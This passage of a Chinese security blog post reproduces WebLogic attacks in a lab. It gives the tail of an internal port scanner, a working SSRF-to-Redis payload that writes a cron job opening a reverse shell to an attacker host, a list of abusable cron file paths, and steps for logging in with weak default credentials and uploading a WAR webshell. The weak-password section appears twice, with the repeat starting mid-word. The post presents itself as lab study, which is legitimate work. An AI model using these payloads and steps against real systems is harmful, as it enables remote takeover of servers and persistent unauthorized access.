            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span> <span class="token string">'[!]'</span><span class="token operator">+</span>final_ip <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> port
        <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"172.18.0"</span>  
    <span class="token keyword">if</span> ip<span class="token punctuation">:</span>
        <span class="token keyword">print</span> ip
        ite_ip<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"no ip"</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/89/ad/0Ui2RdTZ_o.png" alt="image.png"><br> 通过以上的SSRF漏洞，探测探测出存在 redis<br> Weblogic的SSRF有一个比较大的特点,其虽然是一个”GET/POST”请求,但是我们可以通过传入%0a%0d来注入换行符,某些服务(如redis)是通过换行符来分隔每条命令,本环境可以通过该SSRF攻击内网中的redis服务器。</p> 
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：<br> crontab语法：<a href="https://www.jianshu.com/p/ecd6a1cfb73e" rel="nofollow">https://www.jianshu.com/p/ecd6a1cfb73e</a></p> 
<pre><code class="prism language-bash"><span class="token builtin class-name">test</span>

<span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.190.1/4444 0&gt;&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etc/
config <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span>
save

aaa

</code></pre> 
<p>将以上payload进行为uel编码</p> 
<pre><code class="prism language-bash"><span class="token assign-left variable">operator</span><span class="token operator">=</span>http://172.22.0.2:6379/test%0a%0aset%201%20%22%5cn%5cn%5cn%5cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.190.1%2f4444%200%3e%261%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave%0a%0aaaa<span class="token operator">&amp;</span><span class="token assign-left variable">rdoSearch</span><span class="token operator">=</span>name<span class="token operator">&amp;</span><span class="token assign-left variable">txtSearchname</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">txtSearchkey</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span><span class="token assign-left variable">txtSearchfor</span><span class="token operator">=</span><span class="token number">3</span><span class="token operator">&amp;</span><span class="token assign-left variable">selfor</span><span class="token operator">=</span>Business+location<span class="token operator">&amp;</span><span class="token assign-left variable">btnSubmit</span><span class="token operator">=</span>Search
</code></pre> 
<p>发送payload触发反弹shell连接 192.168.190.1:4444<br> <img src="https://images2.imgbox.com/60/63/qGB1ibdR_o.png" alt="image.png"><br> 反弹shell成功<br> <img src="https://images2.imgbox.com/3f/c5/Rqnf5JXd_o.png" alt="image.png"><br> 补充一下，可进行利用的cron有以下几个地方：</p> 
<blockquote> 
 <p>/etc/crontab 这个是肯定的<br> /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也和/etc/crontab相同。 。<br> /var/spool/cron/root centos系统下root用户的cron文件<br> /var/spool/cron/crontabs/root debian系统下root用户的cron文件</p> 
</blockquote> 
<h3><a id="Weblogic__500"></a>Weblogic 弱密码</h3> 
<h4><a id="_501"></a>漏洞复现</h4> 
<blockquote> 
 <p>靶机IP：192.168.190.136<br> 攻击机：192.168.190.1</p> 
</blockquote> 
<p>访问weblogic控制台登录页面<br> <a href="http://192.168.190.136:7001/console/login/LoginForm.jsp" rel="nofollow">http://192.168.190.136:7001/console/login/LoginForm.jsp</a><br> <img src="https://images2.imgbox.com/15/80/jisc5LsM_o.png" alt="image.png"><br> 输入 weblogic/Oracle@123 登录控制台<br> 一次选择部署-》安装-》上载文件<br> <img src="https://images2.imgbox.com/53/ce/3PcbdvYh_o.png" alt="image.png"><br> <img src="https://images2.imgbox.com/6b/fa/VB6t5gko_o.png" alt="image.png"><br> 上传 qwerty.war包<br> <img src="https://images2.imgbox.com/c0/ea/uBGBkOtQ_o.png" alt="image.png"><br> 一次点击下一步至完成部署安装<br> <img src="https://images2.imgbox.com/f2/e6/TPg5939A_o.png" alt="image.png"></p> 
<p>冰鞋连接<br> <img src="https://images2.imgbox.com/e5/48/mTuIX7bP_o.png" alt="image.png"></p> 
<p>机IP：192.168.190.136</p> 
<blockquote> 
 <p>攻击机：192.168.190.1</p> 
</blockquote> 
<p>访问weblogic控制台登录页面<br> <a href="http://192.168.190.136:7001/console/login/LoginForm.jsp" rel="nofollow">http://192.168.190.136:7001/console/login/LoginForm.jsp</a><br> <img src="https://images2.imgbox.com/9e/f8/LjJqEg7B_o.png" alt=""><br> 输入 weblogic/Oracle@123 登录控制台<br> 一次选择部署-》安装-》上载文件<br> <img src="https://images2.imgbox.com/4e/d0/BJWNMJrr_o.png" alt=""><br> <img src="https://images2.imgbox.com/ef/c6/z7SIEQWm_o.png" alt=""><br> 上传 qwerty.war包<br> <img src="https://images2.imgbox.com/bd/24/LjUysgWQ_o.png" alt=""><br> 一次点击下一步至完成部署安装<br> <img src="https://images2.imgbox.com/05/98/jwU94f5Z_o.png" alt=""></p> 
<p>冰鞋连接<br> <img src="https://images2.imgbox.com/1b/8f/r8FrpazC_o.png" alt=""><br> <font color="red"><br> <em><strong>仅用于学习交流，不得用于非法用途<br> 如侵权请私聊博主删文</strong></em><br> </font></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/d07e6f5a9a9abd8965d155d6dd8dec44/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Android studio 实现打电话发短信浏览网页功能 android开发小实验</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/02573edb19de45403b8613a60f092972/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">图文并茂！推荐算法架构——粗排</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>